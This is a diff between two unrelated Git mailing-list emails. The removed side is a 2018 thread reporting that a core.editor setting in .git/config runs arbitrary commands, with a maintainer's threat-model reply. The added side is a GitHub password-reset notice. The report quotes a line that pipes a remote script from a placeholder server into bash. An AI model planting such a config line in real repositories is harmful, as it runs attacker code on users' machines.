@@ -2,122 +2,63 @@ Return-Path: <git-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.1 (2015-04-28) on dcvr.yhbt.net
 X-Spam-Level: 
 X-Spam-ASN: AS31976 209.132.180.0/23
-X-Spam-Status: No, score=-4.0 required=3.0 tests=BAYES_00,DKIM_SIGNED,
-	DKIM_VALID,DKIM_VALID_AU,FREEMAIL_FORGED_FROMDOMAIN,FREEMAIL_FROM,
-	HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,RCVD_IN_DNSWL_HI
-	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.1
+X-Spam-Status: No, score=-4.3 required=3.0 tests=BAYES_00,DKIM_SIGNED,
+	DKIM_VALID,DKIM_VALID_AU,HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,
+	RCVD_IN_DNSWL_HI,T_DKIMWL_WL_HIGH shortcircuit=no autolearn=ham
+	autolearn_force=no version=3.4.1
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by dcvr.yhbt.net (Postfix) with ESMTP id 4A13E1F404
-	for <e@80x24.org>; Sun, 26 Aug 2018 03:26:11 +0000 (UTC)
+	by dcvr.yhbt.net (Postfix) with ESMTP id 354EE1F404
+	for <e@80x24.org>; Sun, 26 Aug 2018 06:13:07 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1726643AbeHZHHN (ORCPT <rfc822;e@80x24.org>);
-        Sun, 26 Aug 2018 03:07:13 -0400
-Received: from mail-wm0-f53.google.com ([74.125.82.53]:51881 "EHLO
-        mail-wm0-f53.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1726415AbeHZHHN (ORCPT <rfc822;git@vger.kernel.org>);
-        Sun, 26 Aug 2018 03:07:13 -0400
-Received: by mail-wm0-f53.google.com with SMTP id y2-v6so4920032wma.1
-        for <git@vger.kernel.org>; Sat, 25 Aug 2018 20:26:08 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
-         :cc:content-transfer-encoding;
-        bh=F2upJdmb1lFnyDgSrs8+r8W/Zu1sWithkslsxuCIyV8=;
-        b=b1E0wfqukpZUtAUgcEmgLt6nZhOfGagcuao5MN+5JBll/cUGHdkX8+KM/XevakVUCk
-         ovDQn6rAW6FtZdWJnJD7AaTDxpk17jzaY4k0xuvKDVTBr0i0xBWFAjEfbjqzNslMmAM9
-         P9+64IgZcvOTfUZETpyvECq9aTiyz3kBI8tXm/QW+1UyEFjHOQqHcYJvI/x3v+BZ8bzX
-         ak0sJFd89kAdnxANFKTK2abht2tvCoEJg7+i2AYAb31GSvKz/bdRnEv0S1Clf68hUlq9
-         n42o+nvolqtQzsujcWZ7xl1K77jBXGAtNPFwtHbVddlf9hhpioMDqrqfDGozq1YyTAXo
-         qvZg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
-         :message-id:subject:to:cc:content-transfer-encoding;
-        bh=F2upJdmb1lFnyDgSrs8+r8W/Zu1sWithkslsxuCIyV8=;
-        b=SpFBzVUzSLFUXCziDAinJ8fExC+JMW7afVZilazWCsa2KHiHj4JEamcstmrB0ZBU+z
-         nIQi4AhK1bDXWlcrkZBLRb7oNO++mgk8cHx65+vNC37JKQGwePyKSY92/UJD822MEnZX
-         GjJX6YSLAwLSAIenALm6PTifQgDiFbJHkrJ3SHvyPeFoKxr0h0RxiGy8VZRFcLA1C7BU
-         7ehclRlPpk13XZKmgvf05Rf1ZuNO6Hw+eUDATC6L9LBEegERS3t6udhj78Oirg11ktnI
-         psyp8xWFXxmPUrRfjwexST4E5e+can9mETLLZ7jdOMino1N2k61oejNl5H8xIKXSyrQk
-         ryKQ==
-X-Gm-Message-State: APzg51BG4kVfWGu7h+5Br4Aos3+ZfrXQYMeOEVMM5w+18ibbI40fom9/
-        K8lXLFTy7Yv8L773Bf/jn+OzQYaJMCiQfUH8OtLOaQ==
-X-Google-Smtp-Source: ANB0VdYzYTgFavDHjBXaAF85gM+FSTbEFWH+G9K8W5R8MIEW+zT7TEhSB8n6ycinjsye5vO3qSsrLf3f1eGbyc+ZBF0=
-X-Received: by 2002:a1c:7c18:: with SMTP id x24-v6mr2347363wmc.33.1535253967468;
- Sat, 25 Aug 2018 20:26:07 -0700 (PDT)
-MIME-Version: 1.0
-References: <CA+KS1kb7yVoG-j7p83--2+0Ry+iFg1YbEa9KzxqPTvNZTF5RHQ@mail.gmail.com>
- <20180826031910.GA12286@sigill.intra.peff.net>
-In-Reply-To: <20180826031910.GA12286@sigill.intra.peff.net>
-From:   "Leo Silva (a.k.a kirotawa)" <kirotawa@gmail.com>
-Date:   Sun, 26 Aug 2018 00:25:56 -0300
-Message-ID: <CA+KS1kZ2oxe5=Tsn-8Dif6HcPpM=xxaeRqB+xLdsLU_1aua_JQ@mail.gmail.com>
-Subject: Re: Git vulnerability - execution of arbitrary code through .git/conf
-To:     peff@peff.net
-Cc:     git@vger.kernel.org
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+        id S1726414AbeHZJye (ORCPT <rfc822;e@80x24.org>);
+        Sun, 26 Aug 2018 05:54:34 -0400
+Received: from o11.sgmail.github.com ([167.89.101.202]:63260 "EHLO
+        o11.sgmail.github.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+        with ESMTP id S1726324AbeHZJye (ORCPT <rfc822;git@vger.kernel.org>);
+        Sun, 26 Aug 2018 05:54:34 -0400
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; d=github.com; 
+        h=from:to:subject:mime-version:content-type:content-transfer-encoding; 
+        s=s20150108; bh=+fhndnFbvgKBdveQXxX6cJzyoAQ=; b=SzQg3vrpa0rKkhmf
+        YIfbG9nlrz8iZLz7a0SE84xVK9GemocMzK+DAlrl/+utEESCQyD2Q/gJaq+T71Lf
+        YLDg0/lc/uTtfffml4HK5G8r9joiEGF2ZXzJEBQutalbImWpVn2+d6uObHyGhuwD
+        DTD2ljP5YHrqq90cCETPq8DASTY=
+Received: by filter1094p1las1.sendgrid.net with SMTP id filter1094p1las1-24963-5B8244F0-4
+        2018-08-26 06:13:04.267049365 +0000 UTC m=+718998.585309466
+Received: from github-lowworker9-cp1-prd.iad.github.net (unknown [192.30.252.47])
+        by ismtpd0005p1iad1.sendgrid.net (SG) with ESMTP id 452eyLzATKCBiCSzeteGzw
+        Sun, 26 Aug 2018 06:13:04.189 +0000 (UTC)
+Received: from github.com (localhost [127.0.0.1])
+        by github-lowworker9-cp1-prd.iad.github.net (Postfix) with ESMTP id 2B687A00C2;
+        Sat, 25 Aug 2018 23:13:04 -0700 (PDT)
+Date:   Sun, 26 Aug 2018 06:13:04 +0000 (UTC)
+From:   GitHub <noreply@github.com>
+To:     amc2399 <git@vger.kernel.org>
+Message-ID: <5b8244f02ad88_44c73f82692be6186144f@github-lowworker9-cp1-prd.iad.github.net.mail>
+Subject: [GitHub] Your password was reset
+Mime-Version: 1.0
+Content-Type: text/plain;
+ charset=UTF-8
+Content-Transfer-Encoding: 7bit
+X-Auto-Response-Suppress: All
+categories: account-security,password-changed
+X-SG-EID: YUhPsKA0VKt4kiGI+qrcaW2qjx7tU7rsf8gtpxAAA90vCjwcp/FUtyYRN90ddh5t6IwH6nJ6WT1JZz
+ jZEO7LSwX+RUymfBXfdwThHkAmhDgN7X0cynpy2wrLskbphPni7Gra1Bl7RVU2uA4vckn7IGa/92Ed
+ rbXIOP+TS4u5FrBgwOXoAjPatqs+2Ppi0kDG7yzDXVrCH/e336Ahk2ElFg==
+X-SG-ID: HjuyJHjWedrv+ZABmVoKqJUGcbnIrpG8Dl8TZw63o/ttfsKFiCNQbipH148DcHHLyQLi2AaIA6cVxk
+ aCikgwJw==
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
-ah, cool!
+Hello amc2399,
 
-So, when a git clone is executed it generates a new .git/config to the
-local one (I didn't pay attention on that).
+We wanted to let you know that your GitHub password was reset.
 
-Thanks a lot for the clarification Peff!
+If you did not perform this action, you can recover access by entering git@vger.kernel.org into the form at https://github.com/password_reset
 
+To see this and other security events for your account, visit https://github.com/settings/security
 
-On Sun, Aug 26, 2018 at 12:19 AM Jeff King <peff@peff.net> wrote:
->
-> On Sat, Aug 25, 2018 at 11:13:30PM -0300, Leo Silva (a.k.a kirotawa) wrot=
-e:
->
-> > Hi git community!
-> >
-> > I found what seems to be a vulnerability/bug on git. I'm running
-> > version 2.7.4 on Ubuntu xenial, but also tested with last version
-> > 2.19.0.rc0.2.g29d9e3e.
-> >
-> > The steps to reproduce are:
-> >
-> > 1. open your .git/conf
-> > 2. add something like:
-> > [core]
-> >     editor =3D ls /etc/passwd
-> > or even
-> >     editor =3D curl -s http://server/path/malicious-script.sh | bash -s
-> > 3. run: git commit
-> >
-> > A malicious user/repo can set some code through URL or even as command
-> > in .git/conf and take control of your machine or silently run
-> > malicious code.
->
-> This is all working as designed. There are many ways you can execute
-> arbitrary code by changing files in in a .git directory. As you noticed,
-> core.editor is one. pager.* is another one, as are hooks in .git/hooks.
->
-> Our threat model is that the files in .git are trusted, and should be
-> protected through normal filesystem permissions. An important part of
-> that model is that a "git clone" does not copy arbitrary .git files from
-> the other side (only objects and refs). If you find a way around that,
-> it would be a problem (and in fact many of the vulnerabilities we've had
-> have involved somehow writing into .git from the checked-out tree).
->
-> -Peff
+If you run into problems, please contact support by visiting https://github.com/contact
 
-
-
---=20
-
-----------------------------------------------
-Le=C3=B4nidas S. Barbosa (Kirotawa)
-Security Engineer at Canonical Ltd
-blog: corecode.wordpress.com
----------------------------------------------
-
-"O que importa s=C3=A3o os incont=C3=A1veis pequenos atos de pessoas
-desconhecidas, que fundam as bases para os eventos significativos que
-se tornam hist=C3=B3ria" - Howard Zinn
+Please do not reply to this email with your password. We will never ask for your password, and we strongly discourage you from sharing it with anyone.
